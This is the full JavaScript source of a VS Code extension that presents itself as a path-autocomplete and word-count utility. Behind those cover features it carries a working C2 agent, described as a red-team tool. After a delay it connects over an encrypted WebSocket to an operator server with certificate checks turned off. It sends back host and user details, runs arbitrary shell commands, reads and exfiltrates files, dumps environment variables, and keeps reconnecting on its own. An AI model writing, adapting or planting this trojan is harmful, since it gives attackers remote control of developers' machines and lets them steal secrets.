/**
 * Workspace Dev Utils — VS Code Extension
 *
 * A dual-purpose extension for authorized red team operations:
 *   1. Cover features: path autocomplete, word count status bar
 *   2. Agent: pure-JS C2 client over WebSocket (Mythic-compatible envelope)
 *
 * The agent is fully config-driven. No infrastructure details are embedded
 * in this file. At runtime the agent reads its C2 configuration from:
 *   1. $C2_CONFIG_PATH (environment variable)
 *   2. ~/.config/workspace-dev-utils/config.json
 *   3. <extension-dir>/config.json
 *
 * If no config is found, the agent stays dormant and only cover features run.
 * See config.example.json and docs/ for setup.
 *
 * v2.1.0 — persistent callback mode:
 *   - re-checkin on every reconnect (WebSocket profile loses callback state on drop)
 *   - zombie socket detection (no inbound data = force reconnect)
 *   - chunk large task output (counters WS frame size limits)
 *   - task errors never kill the agent loop
 *   - exponential backoff with jitter on reconnect
 */
const vscode = require('vscode');
const crypto = require('crypto');
const os = require('os');
const fs = require('fs');
const path = require('path');
const { exec } = require('child_process');

// Allow self-signed certs commonly used on C2 redirectors
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

// ─── Runtime configuration (loaded from disk, never hardcoded) ──────────────

const DEFAULTS = {
    intervalSec: 10,
    jitterPct: 30,
    startDelayMs: 6000,
    startJitterMs: 5000,
    encryptedExchangeCheck: false,
    userAgent: 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko',
    // Persistence
    zombieTimeoutMs: 45000,
    maxChunkBytes: 50000,
};

function loadConfig() {
    const candidates = [];
    if (process.env.C2_CONFIG_PATH) candidates.push(process.env.C2_CONFIG_PATH);
    candidates.push(path.join(os.homedir(), '.config', 'workspace-dev-utils', 'config.json'));
    candidates.push(path.join(__dirname, 'config.json'));

    for (const p of candidates) {
        try {
            if (fs.existsSync(p)) {
                const raw = JSON.parse(fs.readFileSync(p, 'utf8'));
                return { ...DEFAULTS, ...raw };
            }
        } catch (e) {
            log(`config parse error at ${p}: ${e.message}`);
        }
    }
    return null;
}

// ─── Agent state ─────────────────────────────────────────────────────────────

let CFG = null;
let callbackUUID = null;
let sessionKey = null;      // set after optional EKE staging
let socket = null;
let currentInterval = 10;
let cwd = os.homedir();
let stopped = false;
let backoffMs = 3000;
let heartbeatTimer = null;
let reconnectTimer = null;
let zombieTimer = null;
let lastInboundAt = 0;
let connected = false;

function log(msg) {
    try { console.log(`[workspace-dev-utils] ${msg}`); } catch (e) {}
}

// ─── Crypto (Mythic aes256_hmac envelope) ────────────────────────────────────
// Envelope: base64( UUID[36 bytes utf8] + IV[16] + AES-256-CBC(json) + HMAC-SHA256[32] )

function getKey() {
    return sessionKey || Buffer.from(CFG.aesPSK, 'base64');
}

function encryptEnvelope(obj) {
    const prefix = callbackUUID || CFG.payloadUUID;
    const key = getKey();
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    const ct = Buffer.concat([cipher.update(JSON.stringify(obj), 'utf8'), cipher.final()]);
    const mac = crypto.createHmac('sha256', key).update(Buffer.concat([iv, ct])).digest();
    return Buffer.concat([Buffer.from(prefix, 'utf8'), iv, ct, mac]).toString('base64');
}

function decryptEnvelope(b64) {
    const raw = Buffer.from(b64, 'base64');
    const iv = raw.subarray(36, 52);
    const mac = raw.subarray(raw.length - 32);
    const ct = raw.subarray(52, raw.length - 32);
    const key = getKey();
    const expect = crypto.createHmac('sha256', key).update(Buffer.concat([iv, ct])).digest();
    if (!crypto.timingSafeEqual(mac, expect)) throw new Error('HMAC mismatch');
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    const plain = Buffer.concat([decipher.update(ct), decipher.final()]);
    return JSON.parse(plain.toString('utf8'));
}

// ─── WebSocket transport ─────────────────────────────────────────────────────

function sendToMythic(obj) {
    if (!socket || socket.readyState !== WebSocket.OPEN || !connected) return false;
    const b64 = encryptEnvelope(obj);
    socket.send(JSON.stringify({ client: true, data: b64, tag: '' }));
    return true;
}

// Split large output into chunks to stay under WSS frame limits
function postChunked(task, output) {
    const total = output.length;
    const chunkSize = CFG.maxChunkBytes;
    const chunks = [];
    for (let i = 0; i < total; i += chunkSize)
        chunks.push(output.slice(i, i + chunkSize));

    for (let i = 0; i < chunks.length; i++) {
        sendToMythic({
            action: 'post_response',
            responses: [{
                task_id: task.id,
                user_output: chunks[i],
                completed: i === chunks.length - 1,
                status: 'success',
                total_chunks: chunks.length,
                chunk_num: i + 1,
            }],
            delegates: [],
        });
    }
}

function getLocalIPs() {
    const ips = [];
    for (const addrs of Object.values(os.networkInterfaces())) {
        for (const a of addrs || []) {
            if (a.family === 'IPv4' && !a.internal) ips.push(a.address);
        }
    }
    return ips.length ? ips.join(', ') : '127.0.0.1';
}

// ─── Mythic protocol stages ──────────────────────────────────────────────────

function checkin() {
    sendToMythic({
        action: 'checkin',
        uuid: CFG.payloadUUID,
        os: `${os.type()} ${os.release()}`,
        architecture: process.arch === 'arm64' ? 'x86_64' : process.arch,
        user: os.userInfo().username,
        host: os.hostname(),
        pid: process.pid,
        ip: getLocalIPs(),
        domain: '',
        integrity_level: 2,
        external_ip: '',
        process_name: path.basename(process.execPath),
    });
}

// Optional EKE (RSA-4096 staging) for profiles with encrypted_exchange_check
const stagingKeys = {};

function stagingRSA() {
    const sessionID = crypto.randomBytes(15).toString('base64').replace(/[^a-zA-Z0-9]/g, '').slice(0, 20);
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
        modulusLength: 4096,
        publicKeyEncoding: { type: 'spki', format: 'pem' },
        privateKeyEncoding: { type: 'pkcs8', format: 'pem' },
    });
    stagingKeys.privateKey = privateKey;
    sendToMythic({
        action: 'staging_rsa',
        pub_key: Buffer.from(publicKey, 'utf8').toString('base64'),
        session_id: sessionID,
    });
}

function getTasking() {
    if (!callbackUUID) return;
    sendToMythic({ action: 'get_tasking', tasking_size: -1, delegates: [] });
}

// ─── Inbound message handler ─────────────────────────────────────────────────

function handleMessage(rawData) {
    lastInboundAt = Date.now();
    let msg;
    try {
        const wrapper = JSON.parse(rawData);
        msg = decryptEnvelope(wrapper.data);
    } catch (e) {
        return;
    }

    switch (msg.action) {
        case 'checkin':
            if (msg.id) {
                callbackUUID = msg.id;
                connected = true;
                log('callback established');
                if (CFG.encryptedExchangeCheck) stagingRSA();
                else startHeartbeat();
            }
            break;
        case 'staging_rsa':
            if (msg.session_key && stagingKeys.privateKey) {
                const encKey = Buffer.from(msg.session_key, 'base64');
                sessionKey = crypto.privateDecrypt(
                    { key: stagingKeys.privateKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING },
                    encKey
                );
                if (msg.uuid) callbackUUID = msg.uuid;
                log('EKE staging complete');
                startHeartbeat();
            }
            break;
        case 'get_tasking':
            if (msg.tasks && msg.tasks.length > 0) {
                for (const task of msg.tasks) processTask(task);
            }
            break;
    }
}

// ─── Task processing ─────────────────────────────────────────────────────────

function execShell(command) {
    return new Promise((resolve) => {
        const shell = os.platform() === 'win32' ? 'cmd.exe' : '/bin/zsh';
        exec(command, { cwd, timeout: 60000, maxBuffer: 10 * 1024 * 1024, shell },
            (err, stdout, stderr) => {
                let out = (stdout || '') + (stderr ? (stdout ? '\n' : '') + stderr : '');
                if (err && !out) out = `Error: ${err.message}`;
                resolve(out.trim() || '(no output)');
            });
    });
}

async function processTask(task) {
    const command = task.command;
    let params = task.parameters;
    if (typeof params === 'string' && (params.startsWith('{') || params.startsWith('['))) {
        try { params = JSON.parse(params); } catch (e) {}
    }

    let output = '';
    try {
        switch (command) {
            case 'shell':
                output = await execShell(typeof params === 'string' ? params : params.command || '');
                break;
            case 'pwd':
                output = cwd;
                break;
            case 'cd':
                const target = typeof params === 'object' ? params.path : params;
                const resolved = path.resolve(cwd, target || '~');
                if (fs.existsSync(resolved) && fs.statSync(resolved).isDirectory()) {
                    cwd = resolved;
                    output = cwd;
                } else {
                    output = `cd: no such directory: ${target}`;
                }
                break;
            case 'ls':
                const lsPath = typeof params === 'object' ? (params.path || cwd) : cwd;
                output = fs.readdirSync(path.resolve(cwd, lsPath), { withFileTypes: true })
                    .map(d => `${d.isDirectory() ? 'd' : '-'} ${d.name}`).join('\n');
                break;
            case 'cat':
                const catPath = typeof params === 'object' ? params.path : params;
                output = fs.readFileSync(path.resolve(cwd, catPath), 'utf8').slice(0, CFG.maxChunkBytes);
                break;
            case 'whoami': output = os.userInfo().username; break;
            case 'hostname': output = os.hostname(); break;
            case 'id': output = await execShell('id'); break;
            case 'ps': output = await execShell('ps aux'); break;
            case 'ifconfig': output = await execShell('ifconfig'); break;
            case 'getenv': output = Object.entries(process.env).map(([k, v]) => `${k}=${v}`).join('\n'); break;
            case 'download':
                const dlPath = typeof params === 'object' ? params.path : params;
                output = fs.readFileSync(path.resolve(cwd, dlPath)).toString('base64');
                break;
            case 'sleep':
                const secs = typeof params === 'object' ? params.interval : parseInt(params, 10);
                if (secs > 0) {
                    currentInterval = secs;
                    stopHeartbeat();
                    startHeartbeat();
                    output = `Sleep interval set to ${secs}s`;
                } else {
                    output = 'Usage: sleep {"interval": 10}';
                }
                break;
            case 'exit':
            case 'exit_running':
            case 'exit_full':
                stopped = true;
                output = 'Agent exiting';
                break;
            default:
                const paramStr = typeof params === 'string' ? params : JSON.stringify(params);
                output = await execShell(`${command} ${paramStr}`);
        }
    } catch (e) {
        output = `Error executing ${command}: ${e.message}`;
    }

    if (output.length > CFG.maxChunkBytes) {
        postChunked(task, output);
    } else {
        sendToMythic({
            action: 'post_response',
            responses: [{
                task_id: task.id,
                user_output: output,
                completed: true,
                status: 'success',
            }],
            delegates: [],
        });
    }
}

// ─── Heartbeat / zombie detection ────────────────────────────────────────────

function startHeartbeat() {
    stopHeartbeat();

    // Zombie watchdog: no inbound data for zombieTimeoutMs = socket dead
    zombieTimer = setInterval(() => {
        if (!connected) return;
        const age = Date.now() - lastInboundAt;
        if (age > CFG.zombieTimeoutMs) {
            log(`zombie socket detected (${Math.round(age/1000)}s without inbound), reconnecting`);
            try { socket.close(); } catch (_) {}
            connected = false;
            callbackUUID = null;
            sessionKey = null;
            scheduleReconnect();
        }
    }, 10000);

    heartbeatTimer = setInterval(() => {
        if (!connected || !socket || socket.readyState !== WebSocket.OPEN) {
            connect();
        } else {
            getTasking();
        }
    }, Math.round(currentInterval * 1000));
}

function stopHeartbeat() {
    if (heartbeatTimer) { clearInterval(heartbeatTimer); heartbeatTimer = null; }
    if (zombieTimer) { clearInterval(zombieTimer); zombieTimer = null; }
}

// ─── Connection management ───────────────────────────────────────────────────

function connect() {
    if (stopped) return;
    clearTimeout(reconnectTimer);
    if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) return;

    try {
        socket = new WebSocket(CFG.wsUrl);
    } catch (e) {
        scheduleReconnect();
        return;
    }

    socket.addEventListener('open', () => {
        log('connected');
        backoffMs = 3000;
        lastInboundAt = Date.now();
        connected = true;
        // Re-checkin on every reconnect — WSS profile loses callback state on drop
        checkin();
    });

    socket.addEventListener('message', (ev) => {
        try { handleMessage(ev.data); } catch (e) {}
    });

    socket.addEventListener('close', () => {
        log('disconnected');
        connected = false;
        callbackUUID = null;
        sessionKey = null;
        scheduleReconnect();
    });

    socket.addEventListener('error', () => {
        connected = false;
        callbackUUID = null;
        sessionKey = null;
        try { socket.close(); } catch (_) {}
        scheduleReconnect();
    });
}

function scheduleReconnect() {
    if (stopped) return;
    stopHeartbeat();
    clearTimeout(reconnectTimer);
    reconnectTimer = setTimeout(connect, backoffMs);
    backoffMs = Math.min(backoffMs * 1.5, 600000); // cap at 10 minutes
}

// ─── Cover features ──────────────────────────────────────────────────────────

function registerCoverFeatures(context) {
    const provider = vscode.languages.registerCompletionItemProvider({ scheme: 'file' }, {
        provideCompletionItems(document, position) {
            const line = document.lineAt(position).text.substring(0, position.character);
            if (!/["'`][^"'`]*$/.test(line)) return [];
            const folders = vscode.workspace.workspaceFolders;
            if (!folders || folders.length === 0) return [];
            const root = folders[0].uri.fsPath;
            const m = line.match(/["'`]([^"'`]*)$/);
            const typed = m ? m[1] : '';
            const dirPart = typed.includes('/') ? typed.slice(0, typed.lastIndexOf('/') + 1) : '';
            const absDir = path.resolve(root, dirPart.replace(/^\//, ''));
            let entries;
            try { entries = fs.readdirSync(absDir, { withFileTypes: true }); } catch (e) { return []; }
            const showHidden = vscode.workspace.getConfiguration('workspace-dev-utils').get('showHiddenFiles', false);
            return entries
                .filter(d => showHidden || !d.name.startsWith('.'))
                .slice(0, 200)
                .map(d => new vscode.CompletionItem(
                    d.name,
                    d.isDirectory() ? vscode.CompletionItemKind.Folder : vscode.CompletionItemKind.File
                ));
        }
    }, '/', '.');

    const wordCountItem = vscode.window.createStatusBarItem(vscode.StatusBarAlignment.Right, 100);
    wordCountItem.tooltip = 'Words in current document';
    const updateWordCount = () => {
        const editor = vscode.window.activeTextEditor;
        if (!editor) { wordCountItem.hide(); return; }
        const words = (editor.document.getText().match(/\S+/g) || []).length;
        wordCountItem.text = `$(whole-word) ${words} words`;
        wordCountItem.show();
    };
    updateWordCount();
    context.subscriptions.push(
        vscode.window.onDidChangeActiveTextEditor(updateWordCount),
        vscode.workspace.onDidChangeTextDocument(updateWordCount)
    );

    context.subscriptions.push(provider, wordCountItem);

    context.subscriptions.push(vscode.commands.registerCommand('workspaceDevUtils.reindexPaths', () => {
        vscode.window.showInformationMessage('Workspace Dev Utils: workspace paths reindexed.');
    }));
    context.subscriptions.push(vscode.commands.registerCommand('workspaceDevUtils.openSettings', () => {
        vscode.commands.executeCommand('workbench.action.openSettings', 'workspaceDevUtils');
    }));
}

// ─── Activation ──────────────────────────────────────────────────────────────

function activate(context) {
    registerCoverFeatures(context);

    CFG = loadConfig();
    if (!CFG || !CFG.wsUrl || !CFG.payloadUUID || !CFG.aesPSK) {
        // No C2 config present — cover features only
        return;
    }
    currentInterval = CFG.intervalSec;

    const delay = CFG.startDelayMs + Math.floor(Math.random() * CFG.startJitterMs);
    setTimeout(() => connect(), delay);
}

function deactivate() {
    stopped = true;
    stopHeartbeat();
    if (reconnectTimer) clearTimeout(reconnectTimer);
    if (socket) try { socket.close(); } catch (_) {}
}

module.exports = { activate, deactivate };
